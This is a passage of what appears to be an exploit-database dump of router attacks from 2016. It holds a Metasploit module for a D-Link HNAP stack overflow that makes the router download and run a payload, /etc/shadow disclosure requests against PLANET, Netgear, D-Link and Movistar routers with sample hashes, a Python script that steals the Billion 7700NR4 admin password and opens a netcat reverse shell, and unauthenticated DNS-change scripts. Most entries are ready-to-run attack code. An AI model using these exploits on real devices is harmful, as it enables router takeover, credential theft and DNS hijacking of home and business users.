#third gadget - call $a1 (stack pointer):
#.text:00041F3C                 move    $t9, $a1
#.text:00041F40                 move    $a1, $a2
#.text:00041F44                 addiu   $a0, 8
#.text:00041F48                 jr      $t9
#.text:00041F4C                 nop
#When the crash occurs, the stack pointer is at xml_tag_value[3128]. In order to have a larger space for the shellcode (2000+ bytes), we can jump back to the beggining of the buffer.
#prep_shellcode_1:  23bdf7a8  addi  sp,sp,-3128
#prep_shellcode_2:  03a0f809  jalr  sp
#branch_delay:    2084f830  addi  a0,a0,-2000
#The final payload will be:
#shellcode + 'a' * (2064 - shellcode.size) + sleep() + '%31' * 4 + '%32' * 4 + '%33' * 4 + third_gadget + first_gadget + 'b' * 0x1c + second_gadget + 'c' * 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay
# the payload can go in the Action, Username, LoginPassword or Captcha XML tag
# Handle incoming requests from the server
#print_status(""on_request_uri called: #{request.inspect}"")
#do not use SSL","require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
def initialize(info = {})
super(update_info(info,
'Name'           => 'Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow',
'Description'    => %q{
Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which
is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol,
which accepts arbitrarily long strings into certain XML parameters and then copies them into
the stack.
This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested
using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and
this vulnerability is present in both MIPS and ARM devices.
The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a
few load and store instructions. Because of this the payloads have to be sent unencoded, which
can cause them to fail, although the bind shell seems to work well.
For the ARM devices, the inline reverse tcp seems to work best.
Check the reference links to see the vulnerable firmware versions.
'Author'         =>
'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
'License'        => MSF_LICENSE,
'Platform'       => ['linux'],
'References'     =>
['CVE', '2016-6563'],
['US-CERT-VU', '677427'],
['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt'],
['URL', 'http://seclists.org/fulldisclosure/2016/Nov/38']
'DefaultOptions' => { 'WfsDelay' => 10 },
'Stance'         => Msf::Exploit::Stance::Aggressive,          # we need this to run in the foreground (ARM target)
'Targets'        =>
[ 'Dlink DIR-818 / 822 / 823 / 850 [MIPS]',
'Offset'         => 3072,
'LibcBase'       => 0x2aabe000,         # should be the same offset for all firmware versions and all routers
'Sleep'          => 0x56DF0,            # sleep() offset into libuClibc-0.9.30.3.so
'FirstGadget'    => 0x4EA1C,            # see comments below for gadget information
'SecondGadget'   => 0x2468C,
'ThirdGadget'    => 0x41f3c,
'PrepShellcode1' => ""\x23\xbd\xf3\xc8"", # addi  sp,sp,-3128
'PrepShellcode2' => ""\x03\xa0\xf8\x09"", # jalr  sp
'BranchDelay'    => ""\x20\x84\xf8\x30"", # addi  a0,a0,-2000 (nop)
'Arch'           => ARCH_MIPSBE,
'Payload'        =>
'BadChars' => ""\x00"",
'EncoderType'     => Msf::Encoder::Type::Raw      # else it will fail with SIGILL, this CPU is crippled
[ 'Dlink DIR-868 (rev. B and C) / 880 / 885 / 890 / 895 [ARM]',
'Offset'         => 1024,
'LibcBase'       => 0x400DA000,         # we can pick any xyz in 0x40xyz000 (an x of 0/1 works well)
'System'         => 0x5A270,            # system() offset into libuClibc-0.9.32.1.so
'FirstGadget'    => 0x18298,            # see comments below for gadget information
'SecondGadget'   => 0x40CB8,
'Arch'           => ARCH_ARMLE,
'DisclosureDate'  => 'Nov 7 2016',
'DefaultTarget'   => 0))
register_options(
Opt::RPORT(80),
OptString.new('SLEEP', [true, 'Seconds to sleep between requests (ARM only)', '0.5']),
OptString.new('SRVHOST', [true, 'IP address for the HTTP server (ARM only)', '0.0.0.0']),
OptString.new('SRVPORT', [true, 'Port for the HTTP server (ARM only)', '3333']),
OptString.new('SHELL', [true, 'Don\'t change this', '/bin/sh']),
OptString.new('SHELLARG', [true, 'Don\'t change this', 'sh']),
], self.class)
end
def check
begin
res = send_request_cgi({
'uri'     => '/HNAP1/',
'method'  => 'POST',
'Content-Type' => 'text/xml',
'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' }
if res && res.code == 500
return Exploit::CheckCode::Detected
end
rescue ::Rex::ConnectionError
return Exploit::CheckCode::Unknown
end
Exploit::CheckCode::Safe
end
def calc_encode_addr (offset, big_endian = true)
if big_endian
[(target['LibcBase'] + offset).to_s(16)].pack('H*')
else
[(target['LibcBase'] + offset).to_s(16)].pack('H*').reverse
end
end
def prepare_shellcode_arm (cmd)
shellcode = rand_text_alpha(target['Offset']) +       # filler
""\xff\xff\xff\xff"" +                                # n integer overwrite (see advisory)
rand_text_alpha(16) +                               # moar filler
rand_text_alpha(4) +                                # r11
calc_encode_addr(target['FirstGadget'], false) +    # first_gadget
calc_encode_addr(target['System'], false) +         # system() address
calc_encode_addr(target['SecondGadget'], false) +   # second_gadget
cmd                                                 # our command
end
def prepare_shellcode_mips
shellcode = payload.encoded +                                        # exploit
rand_text_alpha(target['Offset'] - payload.encoded.length) +       # filler
calc_encode_addr(target['Sleep']) +                                # s0
rand_text_alpha(4) +                                               # s1
rand_text_alpha(4) +                                               # s2
rand_text_alpha(4) +                                               # s3
calc_encode_addr(target['ThirdGadget']) +                          # s4 (third gadget)
calc_encode_addr(target['FirstGadget']) +                          # initial pc / ra (first_gadget)
rand_text_alpha(0x1c) +                                            # filler
calc_encode_addr(target['SecondGadget']) +                         # second_gadget
rand_text_alpha(0x58) +                                            # filler
target['PrepShellcode1'] +                                         # exploit prep
target['PrepShellcode2'] +                                         # exploit prep
target['BranchDelay']                                              # exploit prep
end
def send_payload (payload)
begin
body = %{
<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
<soap:Body>
<Login xmlns=""http://purenetworks.com/HNAP1/"">
<Action>something</Action>
<Username>Admin</Username>
<LoginPassword></LoginPassword>
<Captcha>#{payload}</Captcha>
</Login>
</soap:Body>
</soap:Envelope>
res = send_request_cgi({
'uri'     => '/HNAP1/',
'method'  => 'POST',
'ctype' => 'text/xml',
'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' },
'data' => body
rescue ::Rex::ConnectionError
fail_with(Failure::Unreachable, ""#{peer} - Failed to connect to the router"")
end
end
def on_request_uri(cli, request)
if (not @pl)
print_error(""#{peer} - A request came in, but the payload wasn't ready yet!"")
return
end
print_status(""#{peer} - Sending the payload to the device..."")
@elf_sent = true
send_response(cli, @pl)
end
def exploit
print_status(""#{peer} - Attempting to exploit #{target.name}"")
if target == targets[0]
send_payload(prepare_shellcode_mips)
else
downfile = rand_text_alpha(8+rand(8))
@pl = generate_payload_exe
@elf_sent = false
resource_uri = '/' + downfile
if datastore['SSL']
ssl_restore = true
datastore['SSL'] = false
end
if (datastore['SRVHOST'] == ""0.0.0.0"" or datastore['SRVHOST'] == ""::"")
srv_host = Rex::Socket.source_address(rhost)
else
srv_host = datastore['SRVHOST']
end
service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
print_status(""#{peer} - Starting up our web service on #{service_url} ..."")
start_service({'Uri' => {
'Proc' => Proc.new { |cli, req|
on_request_uri(cli, req)
'Path' => resource_uri
datastore['SSL'] = true if ssl_restore
print_status(""#{peer} - Asking the device to download and execute #{service_url}"")
filename = rand_text_alpha_lower(rand(8) + 2)
cmd = ""wget #{service_url} -O /tmp/#{filename}; chmod +x /tmp/#{filename}; /tmp/#{filename} &""
shellcode = prepare_shellcode_arm(cmd)
print_status(""#{peer} - \""Bypassing\"" the device's ASLR. This might take up to 15 minutes."")
counter = 0.00
while (not @elf_sent)
if counter % 50.00 == 0 && counter != 0.00
print_status(""#{peer} - Tried #{counter.to_i} times in #{(counter * datastore['SLEEP'].to_f).to_i} seconds."")
end
send_payload(shellcode)
sleep datastore['SLEEP'].to_f     # we need to be in the LAN, so a low value  (< 1s) is fine
counter += 1
end
print_status(""#{peer} - The device downloaded the payload after #{counter.to_i} tries / #{(counter * datastore['SLEEP'].to_f).to_i} seconds."")
end
end
end"
2016-11-08,Remote,Linux_MIPS,Kenzo,Eir D1000 Wireless Router,WAN Side Remote Command Injection (Metasploit),#NAME?,
2016-11-08,Remote,Hardware,Todor Donev,PLANET ADSL Router AND-4101,Remote File Disclosure,"#!/bin/sh
#  PLANET ADSL ROUTER AND-4101 v1.8
#  Remote File Disclosure
#  Modem Name:          ADN-4101
#  HardwareVersion:     ADN-4101
#  SoftwareVersion:     V1.8
#  Firmware Version:    V1.8
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  Thanks to Maya Hristova that support me.
#  #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","[todor@adamantium]$ torsocks GET ""https://TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard"""
2016-11-08,Remote,Hardware,Todor Donev,Netgear WNR500/WNR612v3/JNR1010/JNR2010 ADSL Router,(Authenticated) Remote File Disclosure,"#!/bin/sh
#  NETGEAR ADSL ROUTER
#  Authenticated Remote File Disclosure
#  Hardware Version:    WNR500 / WNR612v3 / JNR1010 / JNR2010
#  Firmware Version:    1.0.7.2 / 1.0.0.9 / 1.0.0.32 / 1.0.0.20
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  Thanks to Maya Hristova that support me.
http://USER:PASSWORD@TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa
#  #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::",
2016-11-08,Remote,Hardware,Todor Donev,Netgear JNR1010 ADSL Router,(Authenticated) Remote File Disclosure,"#!/bin/sh
#  NETGEAR ADSL ROUTER JNR1010 1.0.0.16
#  Authenticated Remote File Disclosure
#  Hardware Version:        JNR1010
#  Firmware Version:        1.0.0.16
#  GUI Language Version:    1.0.0.16
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  Thanks to Maya Hristova that support me.
http://USER:PASSWORD@TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home
#  #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::",
2016-11-08,Remote,Hardware,Todor Donev,D-Link DSL-2730U/2750U/2750E ADSL Router,Remote File Disclosure,"#!/bin/sh
#  D-Link ADSL ROUTER DSL-2730U IN_1.02
#  Remote File Disclosure
#  Modem Name:               DSL-2730U/DSL-2750E
#  Time and Date:            2012-05-23 09:51:16
#  HardwareVersion:          U1
#  Firmware Version:         IN_1.02/SEA_1.04/SEA_1.07
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  Thanks to Maya Hristova that support me.
#  #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#  #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","[todor@adamantium ~]$ torsocks GET ""http://TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard"""
2016-11-08,Remote,Hardware,Todor Donev,MOVISTAR BHS_RTA ADSL Router,Remote File Disclosure,"#!/bin/sh
#  MOVISTAR ADSL ROUTER BHS_RTA BHS_RTA_C0_019
#  Remote File Disclosure
#  Vendor:              OBSERVA
#  Model:               BHS_RTA
#  Software:            BHS_RTA_CO_019
#  Firmware:            09/08/2012-10:23:25
#  Copyright 2016 (c) Todor Donev
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  Thanks to Maya Hristova that support me.
# #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
# root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
# #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","[todor@adamantium ~]$ torsocks GET ""http://TARGET/cgi-bin/webproc?getpage=/etc/shadow&var:language=es_es&var:page="""
2016-10-24,WebApps,Hardware,Sniper Pex,Industrial Secure Routers EDR-810 / EDR-G902 / EDR-G903,Insecure Configuration Management,"Summary:
description:
http://www.moxa.com/product/Industrial_Secure_Routers.htm","Title: Industrial Secure Routers - Insecure Configuration Management
Type: Local/Remote
Author: Nassim Asrir
Author Company: HenceForth
Impact: Insecure Configuration Management
Risk: (4/5)
Release Date: 22.10.2016
Moxa's EDR series industrial Gigabit-performance secure routers are designed to protect the control networks of critical facilities while maintaining fast data transmissions.
The EDR series security routers provides integrated cyber security solutions that combine industrial firewall, VPN, router, and L2 switching* functions into one product specifically
designed for automation networks,which protects the integrity of remote access and critical devices.
Using this Vulnerability we can change the Admin configuration without knowing Password & Username
Because the form for change the configurations is Insecure.
Vendor:
Affected Version:
EDR-810, EDR-G902 and EDR-G903
Tested On:
Linux // Dist (Bugtraq 2)
Vendor Status:
I told them and i wait for the answer.
PoC:
- when you navigate the server automatically you redirect to the login page (http://site/login.asp).
- so Just add in the end of URL (admin.htm) then you get the Form to change the Admin configurations.
Credits
Vulnerability discovered by Nassim Asrir  - <wassline@gmail.com>"
2016-10-06,Remote,Hardware,R-73eN,Billion 7700NR4 Router,Remote Command Execution,"# Title : Billion Router 7700NR4 Remote Root Command Execution
# Date : 06/10/2016
# Author : R-73eN
# Tested on: Billion Router 7700NR4
# Vendor : http://www.billion.com/
# Vulnerability Description:
# This router is a widely used here in Albania. It is given by a telecom provider to the home and bussiness users.
# The problem is that this router has hardcoded credentials which ""can not be changed"" by a normal user. Using these
# credentials we don't have to much access but the lack of authentication security we can download the backup and get the admin password.
# Using that password we can login to telnet server and use a shell escape to get a reverse root connection.
# You must change host with the target and reverse_ip with your attacking ip.
# Fix:
# The only fix is hacking your router with this exploit, changing the credentials and disabling all the other services using iptables.
#Banner
# limited shell escape
#print ""[+] Admin password : "" + str(base64.b64decode(admin_pass)) + "" [+]""","import requests
import base64
import socket
import time
host = """"
def_user = ""user""
def_pass = ""user""
reverse_ip = """"
banner = """"
banner +=""  ___        __        ____                 _    _  \n""
banner +="" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n""
banner +=""  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n""
banner +=""  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n""
banner +="" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n""
print banner
evil = 'ping ;rm /tmp/backpipe;cd tmp;echo ""mknod backpipe p && nc ' + reverse_ip  + ' 1337 0<backpipe | /bin/sh 1>backpipe &"" > /tmp/rev.sh;chmod +x rev.sh;sh /tmp/rev.sh &'
def execute_payload(password):
print ""[+] Please run nc -lvp 1337 and then press any key [+]""
raw_input()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,23))
s.recv(1024)
s.send(""admin\r"")
a= s.recv(1024)
time.sleep(1)
s.send(password +""\r"")
time.sleep(1)
s.recv(1024)
s.send(evil + ""\r"")
time.sleep(1)
print ""[+] If everything worked you should get a reverse shell [+]""
print ""[+] Warning pressing any key will close the SHELL [+]""
raw_input()
r = requests.get(""http://"" + host + ""/backupsettings.conf"" , auth=(def_user,def_pass))
if(r.status_code == 200):
print ""[+] Seems the exploit worked [+]""
print ""[+] Dumping data . . . [+]""
temp = r.text
admin_pass = temp.split(""<AdminPassword>"")[1].split(""</AdminPassword>"")[0]
execute_payload(str(base64.b64decode(admin_pass)))
else:
print ""[-] Exploit Failed [-]""
print ""\n[+] https://www.infogen.al/ [+]\n\n"""
2016-09-13,WebApps,CGI,Todor Donev,ASUS DSL-X11 ADSL Router,DNS Change,"#!/bin/bash
#   ASUS DSL-X11 ADSL Router Unauthenticated  Remote DNS Change Exploit
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""                  ASUS DSL-X11 ADSL Router ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2016-09-13,WebApps,CGI,Todor Donev,COMTREND ADSL Router CT-5367 C01_R12 / CT-5624 C01_R03,DNS Change,"#!/bin/bash
#   COMTREND ADSL Router  CT-5367 C01_R12, CT-5624 C01_R03
#   Unauthenticated Remote DNS Change Exploit
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""             COMTREND ADSL Router  CT-5367 C01_R12, CT-5624 C01_R03""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2016-09-13,WebApps,CGI,Todor Donev,PLANET VDR-300NU ADSL Router,DNS Change,"#!/bin/bash
#   PLANET VDR-300NU ADSL ROUTER
#   Unauthenticated Remote DNS Change Exploit
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""               PLANET VDR-300NU ADSL ROUTER ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2016-09-13,WebApps,CGI,Todor Donev,Inteno EG101R1 VoIP Router,DNS Change,"#!/bin/bash
#   Inteno EG101R1 VoIP Router
#   Unauthenticated Remote DNS Change Exploit
#  Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""               Inteno EG101R1 VoIP Router ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2016 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
